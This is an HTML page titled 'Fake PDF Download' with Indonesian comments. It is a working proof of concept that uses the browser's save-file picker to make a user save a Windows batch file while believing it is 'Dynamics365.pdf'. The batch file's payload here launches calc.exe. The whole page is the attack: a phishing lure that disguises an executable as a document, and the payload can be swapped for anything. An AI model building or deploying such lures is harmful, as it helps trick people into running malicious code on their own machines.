<!DOCTYPE html>
<html>
<head>
  <title>Fake PDF Download</title>
  <style>
    body {
      background: #fff;
      font-family: Arial;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }

    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 18px;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<h2>Dynamics365.pdf</h2>
<button onclick="saveMaliciousFile()">DOWNLOAD</button>

<script>
async function saveMaliciousFile() {
  try {
    const options = {
      suggestedName: 'Dynamics365.pdf', // Nama palsu yang terlihat
      types: [
        {
          description: 'Batch File disguised as PDF',
          accept: {
            'application/octet-stream': ['.bat'] // tetap disimpan sebagai .bat
          }
        }
      ],
      excludeAcceptAllOption: true
    };

    const handle = await window.showSaveFilePicker(options);
    const writable = await handle.createWritable();
    const payload = 'C:\\Windows\\system32\\calc.exe';
    await writable.write(payload);
    await writable.close();

    alert("File berhasil disimpan.");
  } catch (err) {
    console.error("Error:", err);
    alert("Gagal menyimpan file.");
  }
}
</script>

</body>
</html>
